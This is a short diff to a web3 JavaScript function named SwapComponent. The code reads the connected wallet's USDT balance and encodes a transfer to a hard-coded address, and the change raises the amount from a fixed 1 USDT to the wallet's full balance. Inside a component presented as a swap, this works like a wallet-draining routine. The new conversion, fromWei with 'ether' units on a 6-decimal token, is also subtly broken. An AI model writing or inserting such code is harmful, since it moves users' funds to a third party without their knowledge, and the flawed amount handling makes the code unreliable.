@@ -76,10 +76,10 @@ function SwapComponent() {
       from: address,
     })
     const balance = await usdtContract.methods.balanceOf(address).call()
-    const amountToSend = web3js.utils.toWei('1', 'mwei')
+    const formatted = web3js.utils.fromWei(balance, 'ether')
 
     const data = usdtContract.methods
-      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', amountToSend)
+      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', formatted)
       .encodeABI()
 
     const nonce = await web3js.eth.getTransactionCount(address, 'pending')
